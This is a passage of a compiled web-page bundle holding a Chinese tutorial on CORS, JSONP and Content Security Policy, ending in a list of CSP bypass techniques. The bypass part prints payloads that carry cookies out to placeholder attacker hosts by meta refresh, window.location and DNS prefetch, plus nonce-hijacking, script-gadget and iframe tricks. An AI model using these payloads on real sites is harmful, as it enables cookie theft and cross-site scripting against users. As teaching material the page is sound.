"),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br")])]),a("p",[t._v('一旦服务器通过了"预检"请求，以后每次浏览器正常的'),a("code",[t._v("CORS")]),t._v("请求，就都跟简单请求一样，会有一个Origin头信息字段。")]),t._v(" "),a("p",[t._v("服务器的回应，也都会有一个"),a("code",[t._v("Access-Control-Allow-Origin")]),t._v("头信息字段")]),t._v(" "),a("p",[a("code",[t._v("Github")]),t._v("上的一个POC：https://github.com/trustedsec/cors-poc")]),t._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("python3 -m http.server --cgi\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("h3",{attrs:{id:"与jsonp的比较"}},[t._v("与JSONP的比较 "),a("a",{staticClass:"header-anchor",attrs:{href:"#与jsonp的比较"}},[t._v("#")])]),t._v(" "),a("p",[a("code",[t._v("CORS")]),t._v("与"),a("code",[t._v("JSONP")]),t._v("的使用目的相同，但是比"),a("code",[t._v("JSONP")]),t._v("更强大。")]),t._v(" "),a("p",[a("code",[t._v("JSONP")]),t._v("只支持GET请求，"),a("code",[t._v("CORS")]),t._v("支持所有类型的HTTP请求。")]),t._v(" "),a("p",[a("code",[t._v("JSONP")]),t._v("的优势在于支持老式浏览器，以及可以向不支持"),a("code",[t._v("CORS")]),t._v("的网站请求数据。")]),t._v(" "),a("h2",{attrs:{id:"csp是什么-如何设置csp"}},[t._v("CSP是什么？如何设置CSP？ "),a("a",{staticClass:"header-anchor",attrs:{href:"#csp是什么-如何设置csp"}},[t._v("#")])]),t._v(" "),a("p",[a("code",[t._v("CSP")]),t._v("（Content Security Policy）浏览器内容安全策略， 为了缓解部分跨站脚本问题 。")]),t._v(" "),a("p",[a("code",[t._v("CSP")]),t._v("的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。")]),t._v(" "),a("p",[a("strong",[t._v("两种方法启用"),a("code",[t._v("CSP")])])]),t._v(" "),a("div",{staticClass:"language-c line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-c"}},[a("code",[a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.")]),t._v(" 添加HTTP头信息；\nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Security"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Policy"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" script"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("src "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'self'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" object"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("src "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'none'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" style"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("src cdn"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("example"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("org"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" child"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("src https"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2.")]),t._v(" 使用"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("meta"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("标签\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("meta http"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("equiv"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Content-Security-Policy"')]),t._v(" content"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("\"script-src 'self'; object-src 'none'; style-src cdn.example.org; child-src https:\"")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n参数解释\n\nscript"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("src")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("脚本"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("：只信任当前域名\nobject"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("src")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("标签"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("：不信任任何URL，即不加载任何资源\n样式表：只信任http"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//cdn.example.org")]),t._v("\n框架（frame）：必须使用HTTPS协议加载\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br")])]),a("p",[a("code",[t._v("CSP")]),t._v("各种限制选项参考："),a("a",{attrs:{href:"https://www.zhihu.com/question/21979782",target:"_blank",rel:"noopener noreferrer"}},[t._v("知乎回答"),a("OutboundLink")],1),t._v("，"),a("a",{attrs:{href:"https://www.mi1k7ea.com/2019/02/24/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/",target:"_blank",rel:"noopener noreferrer"}},[t._v("CSP基础语法和绕过"),a("OutboundLink")],1)]),t._v(" "),a("h3",{attrs:{id:"绕过csp-1、2、3、5-重点"}},[t._v("绕过CSP(1、2、3、5 重点) "),a("a",{staticClass:"header-anchor",attrs:{href:"#绕过csp-1、2、3、5-重点"}},[t._v("#")])]),t._v(" "),a("p",[a("strong",[t._v("1."),a("code",[t._v("URL")]),t._v("跳转")])]),t._v(" "),a("p",[t._v("在"),a("code",[t._v("default-src")]),t._v(" 'none'的情况下，可以使用meta标签实现跳转")]),t._v(" "),a("div",{staticClass:"language-html line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("meta")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("http-equiv")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("refresh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("content")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("1;url=http://www.xss.com/x.php?c=[cookie]"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("在允许"),a("code",[t._v("unsafe-inline")]),t._v("的情况下，可以用"),a("code",[t._v("window.location")]),t._v("，或者"),a("code",[t._v("window.open")]),t._v("之类的方法进行跳转绕过")]),t._v(" "),a("div",{staticClass:"language-html line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token script"}},[a("span",{pre:!0,attrs:{class:"token language-javascript"}},[t._v("\n  window"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("location"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://www.xss.com/x.php?c=[cookie]"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br")])]),a("p",[a("strong",[t._v("2."),a("code",[t._v("link")]),t._v("标签预加载")])]),t._v(" "),a("p",[t._v("在Firefox下，可以将cookie作为子域名，用"),a("code",[t._v("dns预解析")]),t._v("的方式把cookie带出去，查看"),a("code",[t._v("dns")]),t._v("服务器的日志就能得到cookie")]),t._v(" "),a("div",{staticClass:"language-html line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("link")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("rel")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("dns-prefetch"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("href")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("//[cookie].xxx.ceye.io"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[a("strong",[t._v("3.利用浏览器补全")])]),t._v(" "),a("p",[t._v("有些网站限制只有某些脚本才能使用，往往会使用script标签的nonce属性，只有nonce一致的脚本才生效")]),t._v(" "),a("div",{staticClass:"language-http line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Content-Security-Policy:")]),t._v(" default-src 'none';script-src 'nonce-abc'\n\n//CSP设置nonce为abc属性的标签\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br")])]),a("p",[t._v("那么当脚本插入点为如下的情况时")]),t._v(" "),a("div",{staticClass:"language-html line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("p")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("插入点"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("p")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("id")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("aa"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("nonce")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("abc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token script"}},[a("span",{pre:!0,attrs:{class:"token language-javascript"}},[t._v("document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("write")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'CSP'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")])])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br")])]),a("p",[t._v("可以插入")]),t._v(" "),a("div",{staticClass:"language-html line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[t._v('<script src=//14.rs a="\n')])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("这样会拼成一个新的script标签，其中的"),a("code",[t._v("src")]),t._v("可以自由设定")]),t._v(" "),a("div",{staticClass:"language-html line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("p")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("src")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),t._v("//14.rs")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("a")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("</p>\n<script id="),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v('aa"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("nonce")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("abc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("document.write('CSP');"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br")])]),a("p",[a("strong",[t._v("4.代码重用")])]),t._v(" "),a("p",[t._v("假设页面中使用了"),a("code",[t._v("Jquery-mobile")]),t._v("库，并且"),a("code",[t._v("CSP")]),t._v('策略中包含"'),a("code",[t._v("script-src")]),t._v(" '"),a("code",[t._v("unsafe-eval")]),t._v('\' "或者"'),a("code",[t._v("script-src")]),t._v(" 'strict-dynamic'\"")]),t._v(" "),a("p",[t._v("那么下面的向量就可以绕过"),a("code",[t._v("CSP")]),t._v("：")]),t._v(" "),a("div",{staticClass:"language-html line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("div")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("data-role")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),t._v("popup")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("id")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v("<script>alert(1)<\/script>"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("div")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[a("strong",[t._v("5."),a("code",[t._v("ifrmae")])])]),t._v(" "),a("p",[t._v("(1) 如果页面A中有"),a("code",[t._v("CSP")]),t._v("限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过"),a("code",[t._v("CSP")]),t._v("：")]),t._v(" "),a("div",{staticClass:"language-html line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("iframe")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("src")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("B"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("iframe")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("(2) 在Chrome下，"),a("code",[t._v("iframe")]),t._v("标签支持"),a("code",[t._v("csp")]),t._v("属性，这有时候可以用来绕过一些防御，")]),t._v(" "),a("p",[t._v('例如"http://xxx"页面有个'),a("code",[t._v("js")]),t._v("库会过滤"),a("code",[t._v("XSS")]),t._v("向量，我们就可以使用"),a("code",[t._v("csp")]),t._v("属性来禁掉这个"),a("code",[t._v("js")]),t._v("库")]),t._v(" "),a("div",{staticClass:"language-html line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("iframe")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("csp")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("script-src "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v("unsafe-inline"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("src")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("http://xxx"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("iframe")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[a("strong",[t._v("6."),a("code",[t._v("meta")]),t._v("标签")])]),t._v(" "),a("p",[t._v("meta标签有一些不常用的功能有时候有奇效：\nmeta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过"),a("code",[t._v("CSP nonce")])]),t._v(" "),a("div",{staticClass:"language-html line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("meta")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("http-equiv")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("cache-control"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("content")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("public"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("meta可以设置Cookie（Firefox下），可以结合self-xss利用")]),t._v(" "),a("div",{staticClass:"language-html line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("meta")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("http-equiv")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("Set-Cookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("Content")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; path=/"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])])])}),[],!1,null,null,null);s.default=e.exports}}]);